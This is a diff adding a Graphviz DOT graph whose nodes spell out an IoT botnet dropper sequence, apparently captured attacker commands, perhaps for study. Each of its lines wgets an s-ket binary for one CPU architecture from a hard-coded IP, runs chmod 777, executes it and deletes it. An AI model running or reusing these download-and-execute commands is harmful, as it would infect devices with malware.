@@ -1,0 +1,88 @@
+digraph {
+0 [label="wget http://212.237.34.150/s-ket.arm "];
+0 -> 0
+82 [label="chmod 777 * "];
+82 -> 4 [label=";,"];
+4 [label="./s-ket.arm ssh "];
+4 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 8 [label=";,"];
+8 [label="wget http://212.237.34.150/s-ket.arm5 "];
+8 -> 8
+82 [label="chmod 777 * "];
+82 -> 12 [label=";,"];
+12 [label="./s-ket.arm5 ssh "];
+12 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 16 [label=";,"];
+16 [label="wget http://212.237.34.150/s-ket.arm6 "];
+16 -> 16
+82 [label="chmod 777 * "];
+82 -> 20 [label=";,"];
+20 [label="./s-ket.arm6 ssh "];
+20 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 24 [label=";,"];
+24 [label="wget http://212.237.34.150/s-ket.arm7 "];
+24 -> 24
+82 [label="chmod 777 * "];
+82 -> 28 [label=";,"];
+28 [label="./s-ket.arm7 ssh "];
+28 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 32 [label=";,"];
+32 [label="wget http://212.237.34.150/s-ket.m68k "];
+32 -> 32
+82 [label="chmod 777 * "];
+82 -> 36 [label=";,"];
+36 [label="./s-ket.m68k ssh "];
+36 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 40 [label=";,"];
+40 [label="wget http://212.237.34.150/s-ket.mips "];
+40 -> 40
+82 [label="chmod 777 * "];
+82 -> 44 [label=";,"];
+44 [label="./s-ket.mips ssh "];
+44 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 48 [label=";,"];
+48 [label="wget http://212.237.34.150/s-ket.mpsl "];
+48 -> 48
+82 [label="chmod 777 * "];
+82 -> 52 [label=";,"];
+52 [label="./s-ket.mpsl ssh "];
+52 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 56 [label=";,"];
+56 [label="wget http://212.237.34.150/s-ket.ppc "];
+56 -> 56
+82 [label="chmod 777 * "];
+82 -> 60 [label=";,"];
+60 [label="./s-ket.ppc ssh "];
+60 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 64 [label=";,"];
+64 [label="wget http://212.237.34.150/s-ket.sh4 "];
+64 -> 64
+82 [label="chmod 777 * "];
+82 -> 68 [label=";,"];
+68 [label="./s-ket.sh4 ssh "];
+68 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 72 [label=";,"];
+72 [label="wget http://212.237.34.150/s-ket.spc "];
+72 -> 72
+82 [label="chmod 777 * "];
+82 -> 76 [label=";,"];
+76 [label="./s-ket.spc ssh "];
+76 -> 85 [label=";,"];
+85 [label="rm -rf s-ket.* "];
+85 -> 80 [label=";,"];
+80 [label="wget http://212.237.34.150/s-ket.x86 "];
+80 -> 80
+82 [label="chmod 777 * "];
+82 -> 84 [label=";,"];
+84 [label="./s-ket.x86 ssh "];
+84 -> 85 [label=";,"];
+}
